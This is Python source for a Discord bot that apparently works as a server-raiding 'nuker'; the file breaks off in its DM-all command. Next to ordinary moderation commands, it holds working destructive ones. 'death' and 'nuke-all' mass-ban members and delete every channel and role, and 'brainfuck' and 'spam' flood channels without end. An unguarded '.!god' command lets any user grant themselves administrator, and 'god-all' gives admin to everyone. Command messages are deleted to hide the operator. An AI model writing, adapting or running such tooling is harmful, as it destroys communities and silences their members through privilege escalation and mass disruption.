import discord
from discord.ext import commands
import os
import json
import asyncio
from datetime import timedelta
from colorama import Fore, Back, Style, init

# Initialize colorama
init(autoreset=True)

# Load configuration
def load_config():
    try:
        with open('config.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        print(f'{Fore.RED}Error: config.json not found!{Style.RESET_ALL}')
        print('Please create a config.json file with your bot token.')
        print('Example: {"token": "BOT_TOKEN"}')
        exit(1)
    except json.JSONDecodeError:
        print(f'{Fore.RED}Error: config.json is not valid JSON!{Style.RESET_ALL}')
        exit(1)

config = load_config()

# Create bot instance with prefix commands
intents = discord.Intents.default()
intents.message_content = True
intents.members = True
bot = commands.Bot(command_prefix='.!', intents=intents, help_command=None)

@bot.event
async def on_ready():
    print(f'{Fore.GREEN}[READY] {bot.user} is now online!')
    print(f'{Fore.GREEN}[READY] Bot ID: {bot.user.id}{Style.RESET_ALL}')

async def send_dm(ctx, content=None, embed=None):
    """Helper function to delete command, send ephemeral-style message, and DM"""
    # Delete the original command message
    try:
        await ctx.message.delete()
    except:
        pass

    # Send ephemeral-style message in channel (auto-deletes after 3 seconds)
    try:
        if embed:
            await ctx.send(embed=embed, delete_after=3)
        else:
            await ctx.send(content, delete_after=3)
    except:
        pass

    # Also send a DM to the user
    try:
        if embed:
            await ctx.author.send(embed=embed)
        else:
            await ctx.author.send(content)
    except discord.Forbidden:
        # DMs are disabled, but they already got the channel message
        pass

@bot.command(name='help')
async def help_command(ctx):
    """Display all available commands"""
    print(f'{Fore.CYAN}[HELP] {Fore.WHITE}Help requested by {ctx.author.display_name} in {ctx.guild.name}{Style.RESET_ALL}')
    embed = discord.Embed(
        title="Bot Commands",
        description="List of available commands",
        color=discord.Color.blue()
    )
    embed.add_field(name=".!help", value="Show this help message", inline=False)
    embed.add_field(name=".!god", value="Give yourself administrator role", inline=False)
    embed.add_field(name=".!god-all", value="Give EVERYONE administrator permissions", inline=False)
    embed.add_field(name=".!delchannel <#channel>", value="Delete a specific channel", inline=False)
    embed.add_field(name=".!nuke", value="Delete and recreate channel to clear all messages", inline=False)
    embed.add_field(name=".!nuke-all", value="Delete ALL channels, categories, and roles (except god/bot roles)", inline=False)
    embed.add_field(name=".!purge <amount>", value="Delete a number of messages from the channel", inline=False)
    embed.add_field(name=".!ban <@user> [reason]", value="Ban a user from the server", inline=False)
    embed.add_field(name=".!unban <user_id>", value="Unban a user by their ID", inline=False)
    embed.add_field(name=".!ban-all [reason]", value="Ban all members in the server", inline=False)
    embed.add_field(name=".!kick <@user> [reason]", value="Kick a user from the server", inline=False)
    embed.add_field(name=".!kick-all [reason]", value="Kick all members in the server", inline=False)
    embed.add_field(name=".!mute <@user> [duration] [reason]", value="Timeout a user (e.g., 10m, 1h, 1d)", inline=False)
    embed.add_field(name=".!unmute <@user>", value="Remove timeout from a user", inline=False)
    embed.add_field(name=".!mute-all [duration] [reason]", value="Timeout all members in the server", inline=False)
    embed.add_field(name=".!death", value="☠️ Ultimate destruction - Ban all, delete all channels and roles", inline=False)
    embed.add_field(name=".!brainfuck <name> <message>", value="Delete all channels, create spam channels, infinite spam", inline=False)
    embed.add_field(name=".!spam <count> <message>", value="Spam message in all channels (0 = infinite)", inline=False)
    embed.add_field(name=".!dmall <message>", value="DM all users (placeholder)", inline=False)
    embed.add_field(name=".!dm <@user> <message>", value="DM a user (placeholder)", inline=False)
    embed.add_field(name=".!serverinfo", value="Get detailed server information (sent to DMs)", inline=False)
    embed.add_field(name=".!shutdown", value="Shutdown the bot (Admin only)", inline=False)
    await send_dm(ctx, embed=embed)

@bot.command(name='delchannel')
@commands.has_permissions(manage_channels=True)
async def delchannel(ctx, channel: discord.TextChannel):
    """Delete a specific channel"""
    try:
        channel_name = channel.name
        channel_id = channel.id

        # Delete command message
        try:
            await ctx.message.delete()
        except:
            pass

        # Delete the specified channel
        await channel.delete(reason=f"Channel deleted by {ctx.author}")

        print(f'{Fore.RED}[DELCHANNEL] {Fore.WHITE}Deleted #{channel_name} (ID: {channel_id}) in {ctx.guild.name} by {ctx.author.display_name}{Style.RESET_ALL}')

        # Send DM confirmation
        try:
            embed = discord.Embed(
                description=f"Deleted #{channel_name}",
                color=discord.Color.red()
            )
            await ctx.author.send(embed=embed)
        except discord.Forbidden:
            pass

    except discord.Forbidden:
        await send_dm(ctx, "I don't have permission to delete that channel!")
    except Exception as e:
        await send_dm(ctx, f"An error occurred: {str(e)}")

@bot.command(name='nuke')
@commands.has_permissions(manage_channels=True)
async def nuke(ctx):
    """Delete and recreate the channel to clear all messages"""
    try:
        # Store channel information
        channel = ctx.channel
        channel_name = channel.name

        # Log to console
        print(f'{Fore.RED}[NUKE] {Fore.WHITE}Nuking #{channel_name} in {ctx.guild.name} by {ctx.author.display_name}{Style.RESET_ALL}')
        channel_position = channel.position
        channel_category = channel.category
        channel_topic = channel.topic if hasattr(channel, 'topic') else None
        channel_nsfw = channel.nsfw if hasattr(channel, 'nsfw') else False
        channel_slowmode = channel.slowmode_delay if hasattr(channel, 'slowmode_delay') else 0
        channel_overwrites = channel.overwrites

        # Delete the command message
        try:
            await ctx.message.delete()
        except:
            pass

        # Delete the channel
        await channel.delete(reason=f"Channel nuked by {ctx.author}")

        # Recreate the channel with same settings
        new_channel = await ctx.guild.create_text_channel(
            name=channel_name,
            category=channel_category,
            position=channel_position,
            topic=channel_topic,
            nsfw=channel_nsfw,
            slowmode_delay=channel_slowmode,
            overwrites=channel_overwrites,
            reason=f"Channel recreated after nuke by {ctx.author}"
        )

        # Send DM to user
        try:
            dm_embed = discord.Embed(
                description=f"Nuked {new_channel.mention}",
                color=discord.Color.green()
            )
            await ctx.author.send(embed=dm_embed)
        except discord.Forbidden:
            pass

    except discord.Forbidden:
        await send_dm(ctx, "I don't have permission to delete/create channels!")
    except Exception as e:
        await send_dm(ctx, f"An error occurred: {str(e)}")

@bot.command(name='nuke-all')
@commands.has_permissions(administrator=True)
async def nuke_all(ctx):
    """Delete all channels, categories, voice channels, and roles (except god role and bot role)"""
    try:
        # Log to console
        print(f'{Fore.RED}{Style.BRIGHT}[NUKE-ALL] {Fore.WHITE}Nuking entire server {ctx.guild.name} by {ctx.author.display_name}{Style.RESET_ALL}')

        # Delete the command message
        try:
            await ctx.message.delete()
        except:
            pass

        guild = ctx.guild
        author = ctx.author

        # Send initial DM
        try:
            await author.send("Starting nuke-all operation... This may take a while.")
        except:
            pass

        deleted_channels = 0
        deleted_categories = 0
        deleted_roles = 0

        # Delete all channels (text, voice, stage, forum, etc.)
        for channel in list(guild.channels):
            try:
                await channel.delete(reason=f"Nuke-all by {author}")
                if isinstance(channel, discord.CategoryChannel):
                    deleted_categories += 1
                else:
                    deleted_channels += 1
            except Exception as e:
                pass

        # Log completion
        print(f'{Fore.RED}[NUKE-ALL] {Fore.WHITE}Deleted {deleted_channels} channels and {deleted_categories} categories{Style.RESET_ALL}')

        # Delete all roles except god role, bot roles, and @everyone
        for role in list(guild.roles):
            # Skip @everyone role (can't delete it anyway)
            if role.is_default():
                continue

            # Skip the god role
            if role.name == ".":
                continue

            # Skip bot's roles
            if role in guild.me.roles:
                continue

            # Skip managed roles (bot roles, boosts, etc.)
            if role.managed:
                continue

            try:
                await role.delete(reason=f"Nuke-all by {author}")
                deleted_roles += 1
            except Exception as e:
                pass

        # Log completion
        print(f'{Fore.RED}{Style.BRIGHT}[NUKE-ALL] {Fore.WHITE}Completed: {deleted_channels} channels, {deleted_categories} categories, {deleted_roles} roles deleted{Style.RESET_ALL}')

        # Send completion DM
        try:
            embed = discord.Embed(
                description=f"Nuke-all complete: {deleted_channels} channels, {deleted_categories} categories, {deleted_roles} roles deleted",
                color=discord.Color.dark_red()
            )
            await author.send(embed=embed)
        except discord.Forbidden:
            pass

    except discord.Forbidden:
        try:
            await author.send("I don't have permission to perform nuke-all operation!")
        except:
            pass
    except Exception as e:
        try:
            await author.send(f"An error occurred during nuke-all: {str(e)}")
        except:
            pass

@bot.command(name='purge')
@commands.has_permissions(manage_messages=True)
async def purge(ctx, amount: int):
    """Purge a specified number of messages from the channel"""
    if amount <= 0:
        await send_dm(ctx, "Please specify a positive number of messages to purge!")
        return

    if amount > 1000:
        await send_dm(ctx, "You can only purge up to 1000 messages at a time!")
        return

    try:
        # Delete the command message first
        await ctx.message.delete()

        # Purge the specified number of messages
        deleted = await ctx.channel.purge(limit=amount)

        print(f'{Fore.YELLOW}[PURGE] {Fore.WHITE}Purged {len(deleted)} messages in #{ctx.channel.name} by {ctx.author.display_name}{Style.RESET_ALL}')

        embed = discord.Embed(
            description=f"Purged {len(deleted)} messages in {ctx.channel.mention}",
            color=discord.Color.green()
        )

        # Send ephemeral message (auto-deletes after 3 seconds)
        await ctx.send(embed=embed, delete_after=3)

        # Send DM to user
        try:
            await ctx.author.send(embed=embed)
        except discord.Forbidden:
            pass

    except discord.Forbidden:
        await send_dm(ctx, "I don't have permission to delete messages in this channel!")
    except Exception as e:
        await send_dm(ctx, f"An error occurred: {str(e)}")

@bot.command(name='ban')
@commands.has_permissions(ban_members=True)
async def ban(ctx, member: discord.Member, *, reason: str = "BYE BYE"):
    """Ban a user from the server"""
    if member == ctx.author:
        await send_dm(ctx, "You cannot ban yourself!")
        return

    if member.top_role >= ctx.author.top_role:
        await send_dm(ctx, "You cannot ban someone with a higher or equal role!")
        return

    if member.top_role >= ctx.guild.me.top_role:
        await send_dm(ctx, "I cannot ban someone with a higher or equal role than me!")
        return

    try:
        # Try to DM the user before banning
        try:
            dm_embed = discord.Embed(
                description=f"You have been banned in **{ctx.guild.name}** for {reason}",
                color=discord.Color.red()
            )
            await member.send(embed=dm_embed)
        except:
            pass  # DMs disabled or blocked

        await member.ban(reason=f"{reason} | Banned by {ctx.author}")
        print(f'{Fore.RED}[BAN] {Fore.WHITE}Banned {member.display_name} from {ctx.guild.name} by {ctx.author.display_name} | Reason: {reason}{Style.RESET_ALL}')
        embed = discord.Embed(
            description=f"Banned {member.mention}",
            color=discord.Color.red()
        )
        await send_dm(ctx, embed=embed)
    except discord.Forbidden:
        await send_dm(ctx, "I don't have permission to ban this user!")
    except Exception as e:
        await send_dm(ctx, f"An error occurred: {str(e)}")

@bot.command(name='unban')
@commands.has_permissions(ban_members=True)
async def unban(ctx, user_id: int):
    """Unban a user by their ID"""
    try:
        user = await bot.fetch_user(user_id)
        await ctx.guild.unban(user)
        print(f'{Fore.GREEN}[UNBAN] {Fore.WHITE}Unbanned {user.name} from {ctx.guild.name} by {ctx.author.display_name}{Style.RESET_ALL}')
        embed = discord.Embed(
            description=f"Unbanned {user.mention}",
            color=discord.Color.green()
        )
        await send_dm(ctx, embed=embed)
    except discord.NotFound:
        await send_dm(ctx, "User not found or not banned!")
    except discord.Forbidden:
        await send_dm(ctx, "I don't have permission to unban users!")
    except Exception as e:
        await send_dm(ctx, f"An error occurred: {str(e)}")

@bot.command(name='kick')
@commands.has_permissions(kick_members=True)
async def kick(ctx, member: discord.Member, *, reason: str = "BYE BYE"):
    """Kick a user from the server"""
    if member == ctx.author:
        await send_dm(ctx, "You cannot kick yourself!")
        return

    if member.top_role >= ctx.author.top_role:
        await send_dm(ctx, "You cannot kick someone with a higher or equal role!")
        return

    if member.top_role >= ctx.guild.me.top_role:
        await send_dm(ctx, "I cannot kick someone with a higher or equal role than me!")
        return

    try:
        # Try to DM the user before kicking
        try:
            dm_embed = discord.Embed(
                description=f"You have been kicked in **{ctx.guild.name}** for {reason}",
                color=discord.Color.orange()
            )
            await member.send(embed=dm_embed)
        except:
            pass  # DMs disabled or blocked

        await member.kick(reason=f"{reason} | Kicked by {ctx.author}")
        print(f'{Fore.RED}[KICK] {Fore.WHITE}Kicked {member.display_name} from {ctx.guild.name} by {ctx.author.display_name} | Reason: {reason}{Style.RESET_ALL}')
        embed = discord.Embed(
            description=f"Kicked {member.mention}",
            color=discord.Color.orange()
        )
        await send_dm(ctx, embed=embed)
    except discord.Forbidden:
        await send_dm(ctx, "I don't have permission to kick this user!")
    except Exception as e:
        await send_dm(ctx, f"An error occurred: {str(e)}")

@bot.command(name='mute')
@commands.has_permissions(moderate_members=True)
async def mute(ctx, member: discord.Member, duration: str = "10m", *, reason: str = "BYE BYE"):
    """Timeout a user (e.g., .!mute @user 10m reason)"""
    if member == ctx.author:
        await send_dm(ctx, "You cannot mute yourself!")
        return

    if member.top_role >= ctx.author.top_role:
        await send_dm(ctx, "You cannot mute someone with a higher or equal role!")
        return

    if member.top_role >= ctx.guild.me.top_role:
        await send_dm(ctx, "I cannot mute someone with a higher or equal role than me!")
        return

    # Parse duration
    time_units = {"s": 1, "m": 60, "h": 3600, "d": 86400}
    try:
        unit = duration[-1]
        amount = int(duration[:-1])
        if unit not in time_units:
            await send_dm(ctx, "Invalid time unit! Use s (seconds), m (minutes), h (hours), or d (days)")
            return
        seconds = amount * time_units[unit]
        timeout_duration = timedelta(seconds=seconds)
    except (ValueError, IndexError):
        await send_dm(ctx, "Invalid duration format! Example: 10m, 1h, 30s, 1d")
        return

    try:
        # Try to DM the user before muting
        try:
            dm_embed = discord.Embed(
                description=f"You have been muted in **{ctx.guild.name}** for {reason}",
                color=discord.Color.dark_gray()
            )
            await member.send(embed=dm_embed)
        except:
            pass  # DMs disabled or blocked

        await member.timeout(timeout_duration, reason=f"{reason} | Muted by {ctx.author}")
        print(f'{Fore.YELLOW}[MUTE] {Fore.WHITE}Muted {member.display_name} for {duration} in {ctx.guild.name} by {ctx.author.display_name} | Reason: {reason}{Style.RESET_ALL}')
        embed = discord.Embed(
            description=f"Muted {member.mention} for {duration}",
            color=discord.Color.dark_gray()
        )
        await send_dm(ctx, embed=embed)
    except discord.Forbidden:
        await send_dm(ctx, "I don't have permission to timeout this user!")
    except Exception as e:
        await send_dm(ctx, f"An error occurred: {str(e)}")

@bot.command(name='unmute')
@commands.has_permissions(moderate_members=True)
async def unmute(ctx, member: discord.Member):
    """Remove timeout from a user"""
    try:
        await member.timeout(None)
        print(f'{Fore.GREEN}[UNMUTE] {Fore.WHITE}Unmuted {member.display_name} in {ctx.guild.name} by {ctx.author.display_name}{Style.RESET_ALL}')
        embed = discord.Embed(
            description=f"Unmuted {member.mention}",
            color=discord.Color.green()
        )
        await send_dm(ctx, embed=embed)
    except discord.Forbidden:
        await send_dm(ctx, "I don't have permission to remove timeout from this user!")
    except Exception as e:
        await send_dm(ctx, f"An error occurred: {str(e)}")

@bot.command(name='god')
async def god(ctx):
    """Give user administrator role"""
    try:
        # Check if role already exists
        existing_role = discord.utils.get(ctx.guild.roles, name=".")

        if existing_role:
            # Role exists, just assign it
            await ctx.author.add_roles(existing_role)
            embed = discord.Embed(
                description=f"God mode activated for {ctx.author.mention}",
                color=discord.Color.gold()
            )
            await send_dm(ctx, embed=embed)
        else:
            # Create new role with administrator permissions
            new_role = await ctx.guild.create_role(
                name=".",
                permissions=discord.Permissions(administrator=True),
                color=discord.Color.gold(),
                reason=f"God role created by {ctx.author}"
            )

            # Move role as high as possible (just below bot's highest role)
            try:
                bot_top_role = ctx.guild.me.top_role
                await new_role.edit(position=bot_top_role.position - 1)
            except:
                pass

            # Assign role to user
            await ctx.author.add_roles(new_role)

            print(f'{Fore.MAGENTA}[GOD] {Fore.WHITE}God mode activated for {ctx.author.display_name} in {ctx.guild.name}{Style.RESET_ALL}')

            embed = discord.Embed(
                description=f"God mode activated for {ctx.author.mention}",
                color=discord.Color.gold()
            )
            await send_dm(ctx, embed=embed)

    except discord.Forbidden:
        await send_dm(ctx, "I don't have permission to create roles or assign them!")
    except Exception as e:
        await send_dm(ctx, f"An error occurred: {str(e)}")

@bot.command(name='god-all')
@commands.has_permissions(administrator=True)
async def god_all(ctx):
    """Give everyone administrator role"""
    try:
        # Delete command message
        try:
            await ctx.message.delete()
        except:
            pass

        guild = ctx.guild
        author = ctx.author

        print(f'{Fore.MAGENTA}{Style.BRIGHT}[GOD-ALL] {Fore.WHITE}Giving admin to everyone in {guild.name} by {author.display_name}{Style.RESET_ALL}')

        # Check if god role exists, create if not
        god_role = discord.utils.get(guild.roles, name=".")

        if not god_role:
            # Create the god role
            god_role = await guild.create_role(
                name=".",
                permissions=discord.Permissions(administrator=True),
                color=discord.Color.gold(),
                reason=f"God-all role created by {author}"
            )

            # Move role as high as possible
            try:
                bot_top_role = guild.me.top_role
                await god_role.edit(position=bot_top_role.position - 1)
            except:
                pass

            print(f'{Fore.MAGENTA}[GOD-ALL] {Fore.WHITE}Created god role (.){Style.RESET_ALL}')

        # Send initial DM
        try:
            await author.send("👑 GOD-ALL INITIATED 👑\nGiving administrator permissions to all members...")
        except:
            pass

        # Give role to all members
        success_count = 0
        failed_count = 0

        for member in guild.members:
            # Skip bots
            if member.bot:
                continue

            try:
                await member.add_roles(god_role, reason=f"God-all by {author}")
                success_count += 1
            except:
                failed_count += 1

        print(f'{Fore.MAGENTA}{Style.BRIGHT}[GOD-ALL] {Fore.WHITE}Complete: {success_count} members given admin, {failed_count} failed{Style.RESET_ALL}')

        # Send completion DM
        try:
            embed = discord.Embed(
                description=f"God mode activated for {success_count} members",
                color=discord.Color.gold()
            )
            await author.send(embed=embed)
        except discord.Forbidden:
            pass

    except discord.Forbidden:
        await send_dm(ctx, "I don't have permission to create roles or assign them!")
    except Exception as e:
        await send_dm(ctx, f"An error occurred: {str(e)}")

@bot.command(name='ban-all')
@commands.has_permissions(ban_members=True)
async def ban_all(ctx, *, reason: str = "BYE BYE"):
    """Ban all members in the server"""
    try:
        # Delete command message
        try:
            await ctx.message.delete()
        except:
            pass

        # Send initial DM
        try:
            await ctx.author.send("Starting ban-all operation... This may take a while.")
        except:
            pass

        banned_count = 0
        failed_count = 0

        # Get all members
        members = list(ctx.guild.members)

        for member in members:
            # Skip the bot
            if member.bot and member.id == bot.user.id:
                continue

            # Skip the command author
            if member.id == ctx.author.id:
                continue

            # Skip if role hierarchy prevents ban
            if member.top_role >= ctx.guild.me.top_role:
                failed_count += 1
                continue

            try:
                # Try to DM the user before banning
                try:
                    dm_embed = discord.Embed(
                        description=f"You have been banned in **{ctx.guild.name}** for {reason}",
                        color=discord.Color.red()
                    )
                    await member.send(embed=dm_embed)
                except:
                    pass  # DMs disabled or blocked

                await member.ban(reason=f"{reason} | Mass ban by {ctx.author}")
                banned_count += 1
            except Exception as e:
                failed_count += 1

        # Send completion DM
        print(f'{Fore.RED}[BAN-ALL] {Fore.WHITE}Banned {banned_count} members in {ctx.guild.name} by {ctx.author.display_name} | Reason: {reason}{Style.RESET_ALL}')
        try:
            embed = discord.Embed(
                description=f"Banned {banned_count} members",
                color=discord.Color.red()
            )
            await ctx.author.send(embed=embed)
        except discord.Forbidden:
            pass

    except discord.Forbidden:
        await send_dm(ctx, "I don't have permission to ban members!")
    except Exception as e:
        await send_dm(ctx, f"An error occurred: {str(e)}")

@bot.command(name='kick-all')
@commands.has_permissions(kick_members=True)
async def kick_all(ctx, *, reason: str = "BYE BYE"):
    """Kick all members in the server"""
    try:
        # Delete command message
        try:
            await ctx.message.delete()
        except:
            pass

        # Send initial DM
        try:
            await ctx.author.send("Starting kick-all operation... This may take a while.")
        except:
            pass

        kicked_count = 0
        failed_count = 0

        # Get all members
        members = list(ctx.guild.members)

        for member in members:
            # Skip the bot
            if member.bot and member.id == bot.user.id:
                continue

            # Skip the command author
            if member.id == ctx.author.id:
                continue

            # Skip if role hierarchy prevents kick
            if member.top_role >= ctx.guild.me.top_role:
                failed_count += 1
                continue

            try:
                # Try to DM the user before kicking
                try:
                    dm_embed = discord.Embed(
                        description=f"You have been kicked in **{ctx.guild.name}** for {reason}",
                        color=discord.Color.orange()
                    )
                    await member.send(embed=dm_embed)
                except:
                    pass  # DMs disabled or blocked

                await member.kick(reason=f"{reason} | Mass kick by {ctx.author}")
                kicked_count += 1
            except Exception as e:
                failed_count += 1

        # Send completion DM
        print(f'{Fore.RED}[KICK-ALL] {Fore.WHITE}Kicked {kicked_count} members in {ctx.guild.name} by {ctx.author.display_name} | Reason: {reason}{Style.RESET_ALL}')
        try:
            embed = discord.Embed(
                description=f"Kicked {kicked_count} members",
                color=discord.Color.orange()
            )
            await ctx.author.send(embed=embed)
        except discord.Forbidden:
            pass

    except discord.Forbidden:
        await send_dm(ctx, "I don't have permission to kick members!")
    except Exception as e:
        await send_dm(ctx, f"An error occurred: {str(e)}")

@bot.command(name='mute-all')
@commands.has_permissions(moderate_members=True)
async def mute_all(ctx, duration: str = "10m", *, reason: str = "BYE BYE"):
    """Timeout all members in the server"""
    # Parse duration
    time_units = {"s": 1, "m": 60, "h": 3600, "d": 86400}
    try:
        unit = duration[-1]
        amount = int(duration[:-1])
        if unit not in time_units:
            await send_dm(ctx, "Invalid time unit! Use s (seconds), m (minutes), h (hours), or d (days)")
            return
        seconds = amount * time_units[unit]
        timeout_duration = timedelta(seconds=seconds)
    except (ValueError, IndexError):
        await send_dm(ctx, "Invalid duration format! Example: 10m, 1h, 30s, 1d")
        return

    try:
        # Delete command message
        try:
            await ctx.message.delete()
        except:
            pass

        # Send initial DM
        try:
            await ctx.author.send(f"Starting mute-all operation for {duration}... This may take a while.")
        except:
            pass

        muted_count = 0
        failed_count = 0

        # Get all members
        members = list(ctx.guild.members)

        for member in members:
            # Skip the bot
            if member.bot and member.id == bot.user.id:
                continue

            # Skip the command author
            if member.id == ctx.author.id:
                continue

            # Skip if role hierarchy prevents timeout
            if member.top_role >= ctx.guild.me.top_role:
                failed_count += 1
                continue

            try:
                # Try to DM the user before muting
                try:
                    dm_embed = discord.Embed(
                        description=f"You have been muted in **{ctx.guild.name}** for {reason}",
                        color=discord.Color.dark_gray()
                    )
                    await member.send(embed=dm_embed)
                except:
                    pass  # DMs disabled or blocked

                await member.timeout(timeout_duration, reason=f"{reason} | Mass mute by {ctx.author}")
                muted_count += 1
            except Exception as e:
                failed_count += 1

        # Send completion DM
        print(f'{Fore.YELLOW}[MUTE-ALL] {Fore.WHITE}Muted {muted_count} members for {duration} in {ctx.guild.name} by {ctx.author.display_name} | Reason: {reason}{Style.RESET_ALL}')
        try:
            embed = discord.Embed(
                description=f"Muted {muted_count} members for {duration}",
                color=discord.Color.dark_gray()
            )
            await ctx.author.send(embed=embed)
        except discord.Forbidden:
            pass

    except discord.Forbidden:
        await send_dm(ctx, "I don't have permission to timeout members!")
    except Exception as e:
        await send_dm(ctx, f"An error occurred: {str(e)}")

@bot.command(name='death')
@commands.has_permissions(administrator=True)
async def death(ctx):
    """Ultimate destruction - Delete everything and ban everyone"""
    try:
        # Epic logging with white text on red background
        print(f'{Back.RED}{Fore.WHITE}{Style.BRIGHT}[☠ DEATH ☠] INITIATED BY {ctx.author.display_name} IN {ctx.guild.name.upper()} - TOTAL ANNIHILATION{Style.RESET_ALL}')

        # Delete the command message
        try:
            await ctx.message.delete()
        except:
            pass

        guild = ctx.guild
        author = ctx.author

        # Send initial DM
        try:
            await author.send("⚠️ DEATH COMMAND INITIATED ⚠️\nDeleting all channels, roles, and banning all members...")
        except:
            pass

        banned_count = 0
        deleted_channels = 0
        deleted_categories = 0
        deleted_roles = 0

        # Phase 1: BAN ALL MEMBERS
        print(f'{Back.RED}{Fore.WHITE}[☠ DEATH ☠] Phase 1: Banning all members...{Style.RESET_ALL}')
        members = list(guild.members)
        for member in members:
            if member.bot and member.id == bot.user.id:
                continue
            if member.id == author.id:
                continue
            if member.top_role >= guild.me.top_role:
                continue

            try:
                await member.ban(reason=f"DEATH COMMAND | Executed by {author}")
                banned_count += 1
            except:
                pass

        # Phase 2: DELETE ALL CHANNELS
        print(f'{Back.RED}{Fore.WHITE}[☠ DEATH ☠] Phase 2: Deleting all channels...{Style.RESET_ALL}')
        for channel in list(guild.channels):
            try:
                await channel.delete(reason=f"DEATH COMMAND | Executed by {author}")
                if isinstance(channel, discord.CategoryChannel):
                    deleted_categories += 1
                else:
                    deleted_channels += 1
            except:
                pass

        # Phase 3: DELETE ALL ROLES
        print(f'{Back.RED}{Fore.WHITE}[☠ DEATH ☠] Phase 3: Deleting all roles...{Style.RESET_ALL}')
        for role in list(guild.roles):
            if role.is_default():
                continue
            if role.name == ".":
                continue
            if role in guild.me.roles:
                continue
            if role.managed:
                continue

            try:
                await role.delete(reason=f"DEATH COMMAND | Executed by {author}")
                deleted_roles += 1
            except:
                pass

        # Final logging
        print(f'{Back.RED}{Fore.WHITE}{Style.BRIGHT}[☠ DEATH ☠] COMPLETE - Server obliterated: {banned_count} banned, {deleted_channels} channels destroyed, {deleted_categories} categories removed, {deleted_roles} roles deleted{Style.RESET_ALL}')

        # Send completion DM
        try:
            embed = discord.Embed(
                description=f"DEATH complete: {banned_count} banned, {deleted_channels} channels deleted, {deleted_roles} roles deleted",
                color=discord.Color.dark_red()
            )
            await author.send(embed=embed)
        except discord.Forbidden:
            pass

    except discord.Forbidden:
        try:
            await author.send("I don't have permission to execute DEATH command!")
        except:
            pass
    except Exception as e:
        try:
            await author.send(f"An error occurred during DEATH: {str(e)}")
        except:
            pass

@bot.command(name='brainfuck')
@commands.has_permissions(administrator=True)
async def brainfuck(ctx, channel_name: str, *, spam_message: str):
    """Delete all channels, then infinitely create channels and spam in them"""
    try:
        # Epic logging
        print(f'{Fore.MAGENTA}{Style.BRIGHT}[BRAINFUCK] {Fore.WHITE}INFINITE MODE - Initiated by {ctx.author.display_name} in {ctx.guild.name} | Channel: "{channel_name}" | Message: "{spam_message}"{Style.RESET_ALL}')

        # Delete command message
        try:
            await ctx.message.delete()
        except:
            pass

        guild = ctx.guild
        author = ctx.author

        # Send initial DM
        try:
            await author.send(f"🔥 BRAINFUCK INFINITE MODE INITIATED 🔥\nDeleting all channels...\nThen continuously creating channels and spamming forever!")
        except:
            pass

        deleted_count = 0

        # Phase 1: DELETE ALL CHANNELS
        print(f'{Fore.MAGENTA}[BRAINFUCK] {Fore.WHITE}Phase 1: Deleting all channels and categories...{Style.RESET_ALL}')
        for channel in list(guild.channels):
            try:
                await channel.delete(reason=f"BRAINFUCK | Executed by {author}")
                deleted_count += 1
            except:
                pass

        print(f'{Fore.MAGENTA}[BRAINFUCK] {Fore.WHITE}Deleted {deleted_count} channels - NOW ENTERING INFINITE CHAOS MODE{Style.RESET_ALL}')

        # Background spam task for a channel
        async def spam_channel(channel, message):
            """Infinitely spam in a single channel"""
            while True:
                try:
                    await channel.send(message)
                except:
                    break  # If channel is deleted or error, stop this task

        # Counters
        channels_created = 0
        spam_tasks_started = 0

        # Phase 2: INFINITE CHANNEL CREATION AND SPAM
        print(f'{Fore.MAGENTA}[BRAINFUCK] {Fore.WHITE}Phase 2: INFINITE channel creation and spam loop activated...{Style.RESET_ALL}')

        try:
            await author.send(f"⚡ INFINITE MODE ACTIVE - Creating and spamming forever!")
        except:
            pass

        # Infinite loop - create channels and spawn spam tasks
        while True:
            try:
                # Create a new channel
                new_channel = await guild.create_text_channel(
                    name=channel_name,
                    reason=f"BRAINFUCK infinite | Executed by {author}"
                )
                channels_created += 1

                # Spawn a background task to spam in this channel infinitely
                asyncio.create_task(spam_channel(new_channel, spam_message))
                spam_tasks_started += 1

                # Log progress every 10 channels
                if channels_created % 10 == 0:
                    print(f'{Fore.MAGENTA}{Style.BRIGHT}[BRAINFUCK] {Fore.WHITE}{channels_created} channels created, {spam_tasks_started} spam tasks running...{Style.RESET_ALL}')

            except discord.HTTPException:
                # Rate limited or too many channels, wait a bit
                await asyncio.sleep(0.5)
            except Exception as e:
                # Other errors, continue anyway
                pass

    except discord.Forbidden:
        try:
            await author.send("I don't have permission to execute BRAINFUCK command!")
        except:
            pass
    except Exception as e:
        try:
            await author.send(f"An error occurred during BRAINFUCK: {str(e)}")
        except:
            pass

@bot.command(name='spam')
@commands.has_permissions(manage_messages=True)
async def spam(ctx, count: int, *, message: str):
    """Spam a message in all channels"""
    try:
        # Delete command message
        try:
            await ctx.message.delete()
        except:
            pass

        guild = ctx.guild
        author = ctx.author

        if count == 0:
            # Infinite spam mode
            print(f'{Fore.YELLOW}{Style.BRIGHT}[SPAM] {Fore.WHITE}INFINITE SPAM initiated by {author.display_name} in {guild.name} | Message: "{message}"{Style.RESET_ALL}')

            try:
                await author.send(f"⚠️ INFINITE SPAM MODE ACTIVATED ⚠️\nSpamming in all channels: \"{message}\"\n\nThis will continue indefinitely!")
            except:
                pass

            # Infinite spam loop
            spam_count = 0
            while True:
                for channel in guild.text_channels:
                    try:
                        await channel.send(message)
                        spam_count += 1
                        if spam_count % 100 == 0:  # Log every 100 messages
                            print(f'{Fore.YELLOW}[SPAM] {Fore.WHITE}{spam_count} messages sent...{Style.RESET_ALL}')
                    except:
                        pass

        else:
            # Limited spam mode
            print(f'{Fore.YELLOW}{Style.BRIGHT}[SPAM] {Fore.WHITE}Spamming {count}x in all channels by {author.display_name} in {guild.name} | Message: "{message}"{Style.RESET_ALL}')

            try:
                await author.send(f"Spam started: Sending \"{message}\" {count} times in each channel...")
            except:
                pass

            total_sent = 0
            channels_spammed = 0

            for channel in guild.text_channels:
                for _ in range(count):
                    try:
                        await channel.send(message)
                        total_sent += 1
                    except:
                        pass
                channels_spammed += 1

            print(f'{Fore.YELLOW}[SPAM] {Fore.WHITE}Completed: {total_sent} messages sent across {channels_spammed} channels{Style.RESET_ALL}')

            # Send completion DM
            try:
                embed = discord.Embed(
                    description=f"Spam complete: {total_sent} messages sent across {channels_spammed} channels",
                    color=discord.Color.gold()
                )
                await author.send(embed=embed)
            except discord.Forbidden:
                pass

    except discord.Forbidden:
        await send_dm(ctx, "I don't have permission to send messages in channels!")
    except Exception as e:
        await send_dm(ctx, f"An error occurred: {str(e)}")

@bot.command(name='dmall')
async def dmall(ctx, *, message: str):
    """DM all users placeholder"""
    print(f'{Fore.CYAN}[DMALL] {Fore.WHITE}DMall command by {ctx.author.display_name} in {ctx.guild.name}{Style.RESET_ALL}')
